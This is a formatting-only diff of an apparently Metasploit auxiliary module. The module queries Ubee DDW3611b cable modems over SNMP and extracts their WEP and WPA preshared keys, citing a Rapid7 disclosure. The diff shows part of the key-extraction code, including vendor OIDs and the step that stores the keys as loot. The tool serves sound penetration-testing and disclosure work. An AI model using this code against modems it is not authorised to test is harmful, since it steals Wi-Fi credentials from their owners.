@@ -10,23 +10,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Ubee DDW3611b Cable Modem Wifi Enumeration',
+      'Name' => 'Ubee DDW3611b Cable Modem Wifi Enumeration',
       'Description' => %q{
         This module will extract WEP keys and WPA preshared keys from
         certain Ubee cable modems.
       },
-      'References'  =>
-        [
-          [ 'URL', 'https://blog.rapid7.com/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string' ]
-        ],
-      'Author'      => ['Deral "PercentX" Heiland'],
-      'License'     => MSF_LICENSE
+      'References' => [
+        [ 'URL', 'https://blog.rapid7.com/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string' ]
+      ],
+      'Author' => ['Deral "PercentX" Heiland'],
+      'License' => MSF_LICENSE
     )
-
   end
 
   def run_host(ip)
-      output_data = {}
+    output_data = {}
     begin
       snmp = connect_snmp
 
@@ -55,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
 
           # WEP enabled
           elsif wifiversion == "1"
-          weptype = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.2.12')
+            weptype = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.2.12')
             if weptype == "2"
               wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.1')
               key1 = "#{wepkey1}".unpack('H*')
@@ -133,24 +131,23 @@ class MetasploitModule < Msf::Auxiliary
           end
 
         else
-         print_line("WIFI is not enabled")
-         end
+          print_line("WIFI is not enabled")
+        end
+      end
+      # Woot we got loot.
+      loot_name = "ubee_wifi"
+      loot_type = "text/plain"
+      loot_filename = "ubee_wifi.txt"
+      loot_desc = "Ubee Wifi configuration data"
+      p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo, loot_filename, loot_desc)
+      print_good("WiFi Data saved: #{p}")
+    rescue ::SNMP::UnsupportedVersion
+    rescue ::SNMP::RequestTimeout
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("#{ip} - Error: #{e.class} #{e}")
+      disconnect_snmp
     end
-     # Woot we got loot.
-     loot_name     = "ubee_wifi"
-     loot_type     = "text/plain"
-     loot_filename = "ubee_wifi.txt"
-     loot_desc     = "Ubee Wifi configuration data"
-     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)
-     print_good("WiFi Data saved: #{p}")
-
-     rescue ::SNMP::UnsupportedVersion
-     rescue ::SNMP::RequestTimeout
-     rescue ::Interrupt
-       raise $!
-     rescue ::Exception => e
-       print_error("#{ip} - Error: #{e.class} #{e}")
-     disconnect_snmp
-     end
   end
 end
